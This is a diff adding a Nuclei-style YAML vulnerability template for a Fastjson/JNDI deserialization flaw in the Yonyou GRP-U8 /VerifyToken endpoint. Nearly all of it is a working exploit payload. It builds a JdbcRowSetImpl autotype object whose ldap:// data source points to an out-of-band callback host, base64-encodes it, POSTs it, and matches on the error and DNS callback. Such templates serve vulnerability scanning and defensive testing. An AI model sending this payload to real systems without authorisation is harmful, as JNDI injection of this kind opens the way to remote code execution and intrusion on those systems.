@@ -1,0 +1,34 @@
+id: poc-yaml-grp-u8-verifytoken-unserialize
+
+info:
+  name: 用友GRP-U8 VerifyToken 反序列化漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,反序列化
+
+variables:
+  domain: '{{interactsh-url}}'
+  param: '{{concat("{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://", domain, "\",\"autoCommit\":true}}")}}'
+  payload: '{{base64(param)}}'
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/VerifyToken'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'PARAM={{payload}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "JNDI"
+        part: body
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
